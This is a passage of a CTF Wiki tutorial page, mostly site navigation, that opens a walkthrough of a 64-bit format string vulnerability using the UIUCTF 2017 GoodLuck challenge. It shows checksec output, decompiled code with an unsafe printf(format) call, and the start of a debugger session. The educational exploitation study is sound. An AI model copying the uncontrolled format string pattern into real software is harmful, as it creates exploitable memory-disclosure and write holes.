      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/use_after_free-zh/" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/fastbin_attack-zh/" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/unsorted_bin_attack-zh/" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/large_bin_attack-zh/" class="md-nav__link">
      Large Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/tcache_attack-zh/" class="md-nav__link">
      Tcache Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_einherjar-zh/" class="md-nav__link">
      House of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_force-zh/" class="md-nav__link">
      House of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_lore-zh/" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_orange-zh/" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_rabbit-zh/" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/house_of_roman-zh/" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="IO_FILE Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        <span class="md-nav__icon md-icon"></span>
        IO_FILE Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction-zh/" class="md-nav__link">
      FILE Structure Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit-zh/" class="md-nav__link">
      Forged Vtable to Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop-zh/" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24-zh/" class="md-nav__link">
      Use of IO_FILE Under Glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Race Condition
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Race Condition" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        <span class="md-nav__icon md-icon"></span>
        Race Condition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction-zh/" class="md-nav__link">
      Race Condition Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Integer Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        <span class="md-nav__icon md-icon"></span>
        Integer Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof-zh/" class="md-nav__link">
      Introduction to The Principle of Integer Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox Escape
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Sandbox Escape" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        <span class="md-nav__icon md-icon"></span>
        Sandbox Escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape-zh/" class="md-nav__link">
      Python Sandbox Escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      Linux Kernel
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Kernel" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        <span class="md-nav__icon md-icon"></span>
        Linux Kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf-zh/" class="md-nav__link">
      Kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop-zh/" class="md-nav__link">
      Kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr-zh/" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep-zh/" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch-zh/" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="arm-pwn" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        <span class="md-nav__icon md-icon"></span>
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment-zh/" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop-zh/" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        <span class="md-nav__icon md-icon"></span>
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address-zh/" class="md-nav__link">
      Address Leaking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow-zh/" class="md-nav__link">
      Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell-zh/" class="md-nav__link">
      Get Shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme-zh/" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        <span class="md-nav__icon md-icon"></span>
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop-zh/" class="md-nav__link">
      Android Development Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android Application Operating Mechanism Brief
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Application Operating Mechanism Brief" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        <span class="md-nav__icon md-icon"></span>
        Android Application Operating Mechanism Brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme-zh/" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The Operating Mechanism of the Java Layer in Android
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="The Operating Mechanism of the Java Layer in Android" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        <span class="md-nav__icon md-icon"></span>
        The Operating Mechanism of the Java Layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" class="md-nav__link">
      Smali Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex and ODEX
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Dex and ODEX" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        <span class="md-nav__icon md-icon"></span>
        Dex and ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native Layer Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Native Layer Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        <span class="md-nav__icon md-icon"></span>
        Android Native Layer Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/" class="md-nav__link">
      Android SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android Reverse Basic Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Reverse Basic Introduction" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        <span class="md-nav__icon md-icon"></span>
        Android Reverse Basic Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview-zh/" class="md-nav__link">
      Brief Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location-zh/" class="md-nav__link">
      Android Key Part Location
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android Simple Static Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Static Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Static Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example-zh/" class="md-nav__link">
      Android Java Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example-zh/" class="md-nav__link">
      Android Native Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example-zh/" class="md-nav__link">
      Android Static Analysis Hybrid Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android Simple Dynamic Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Android Simple Dynamic Analysis" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        Android Simple Dynamic Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/" class="md-nav__link">
      Android Dynamic Debugging SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ICS" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        <span class="md-nav__icon md-icon"></span>
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs-zh/" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover-zh/" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit-zh/" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn-zh/" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#64-bit-program-format-string-vulnerability" class="md-nav__link">
    64-bit program format string vulnerability
  </a>
  
    <nav class="md-nav" aria-label="64-bit program format string vulnerability">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples" class="md-nav__link">
    Examples
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset" class="md-nav__link">
    Determining the offset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program" class="md-nav__link">
    Using the program
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-got" class="md-nav__link">
    hijack GOT
  </a>
  
    <nav class="md-nav" aria-label="hijack GOT">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_1" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_1" class="md-nav__link">
    Examples
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_1" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-ideas" class="md-nav__link">
    Exploiting ideas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability-program" class="md-nav__link">
    Vulnerability Program
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hijack-retaddr" class="md-nav__link">
    hijack retaddr
  </a>
  
    <nav class="md-nav" aria-label="hijack retaddr">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_2" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_2" class="md-nav__link">
    Examples
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_2" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas" class="md-nav__link">
    Using ideas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_1" class="md-nav__link">
    Determining the offset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-address" class="md-nav__link">
    Change address
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_1" class="md-nav__link">
    Using the program
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#formatted-string-vulnerability-on-heap" class="md-nav__link">
    Formatted string vulnerability on heap
  </a>
  
    <nav class="md-nav" aria-label="Formatted string vulnerability on heap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_3" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#examples_3" class="md-nav__link">
    Examples
  </a>
  
    <nav class="md-nav" aria-label="Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determining-protection_3" class="md-nav__link">
    Determining protection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    分析程序
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ideas_1" class="md-nav__link">
    Using ideas
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-relevant-address-and-offset" class="md-nav__link">
    Get the relevant address and offset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constructing-a-contact-to-get-the-heap-address" class="md-nav__link">
    Constructing a contact to get the heap address
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#modify-ebp" class="md-nav__link">
    Modify ebp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-shell" class="md-nav__link">
    Get the shell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-program_2" class="md-nav__link">
    Using the program
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#format-string-blind-hit" class="md-nav__link">
    Format string blind hit
  </a>
  
    <nav class="md-nav" aria-label="Format string blind hit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principle_4" class="md-nav__link">
    Principle
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-1-leaking-stack" class="md-nav__link">
    Example 1 - Leaking Stack
  </a>
  
    <nav class="md-nav" aria-label="Example 1 - Leaking Stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs" class="md-nav__link">
    Determine the number of programs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use" class="md-nav__link">
    Use
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2-blind-hijacking-got" class="md-nav__link">
    Example 2 - Blind hijacking got
  </a>
  
    <nav class="md-nav" aria-label="Example 2 - Blind hijacking got">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-the-number-of-programs_1" class="md-nav__link">
    Determine the number of programs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determining-the-offset_2" class="md-nav__link">
    Determining the offset
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-binary" class="md-nav__link">
    leaking binary
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ary" class="md-nav__link">
    分析斌ary
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#title" class="md-nav__link">
    Title
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/fmtstr/fmtstr_example.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <p><a href="./">EN</a> | <a href="../fmtstr_example-zh/">ZH</a></p>
<h1 id="format-string-vulnerability-example">Format string vulnerability example<a class="headerlink" href="#format-string-vulnerability-example" title="Permanent link">&para;</a></h1>
<p>The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings.</p>
<h2 id="64-bit-program-format-string-vulnerability">64-bit program format string vulnerability<a class="headerlink" href="#64-bit-program-format-string-vulnerability" title="Permanent link">&para;</a></h2>
<h3 id="principle">Principle<a class="headerlink" href="#principle" title="Permanent link">&para;</a></h3>
<p>In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string.</p>
<h3 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h3>
<p>Here, we introduce the [pwn200 GoodLuck] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a>) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.</p>
<h4 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜  <span class="m">2017</span>-UIUCTF-pwn200-GoodLuck git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec goodluck

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program has NX protection and partial RELRO protection enabled.</p>
<h4 id="_1">分析程序<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
<p>It can be found that the vulnerability of the program is obvious</p>
<div class="highlight"><pre><span></span><code>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>

  <span class="p">{</span>

<span class="n">v5</span> <span class="o">=</span> <span class="n">format</span> <span class="p">[</span><span class="n">j</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v5</span> <span class="o">||</span> <span class="n">v11</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>

    <span class="p">{</span>

      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You answered:&quot;</span><span class="p">);</span>

      <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>

      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">But that was totally wrong lol get rekt&quot;</span><span class="p">);</span>

      <span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>

      <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

      <span class="k">goto</span> <span class="n">LABEL_11</span><span class="p">;</span>

    <span class="p">}</span>

  <span class="p">}</span>
</code></pre></div>
<h4 id="determining-the-offset">Determining the offset<a class="headerlink" href="#determining-the-offset" title="Permanent link">&para;</a></h4>
<p>We offset the following at printf, here we only focus on the code part and the stack part.</p>
<div class="highlight"><pre><span></span><code>gef➤  b <span class="nb">printf</span>

Breakpoint <span class="m">1</span> at 0x400640

gef➤  r

Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 

what<span class="s1">&#39;s the flag</span>

<span class="s1">123456</span>

<span class="s1">You answered:</span>



<span class="s1">Breakpoint 1, __printf (format=0x602830 &quot;123456&quot;) at printf.c:28</span>

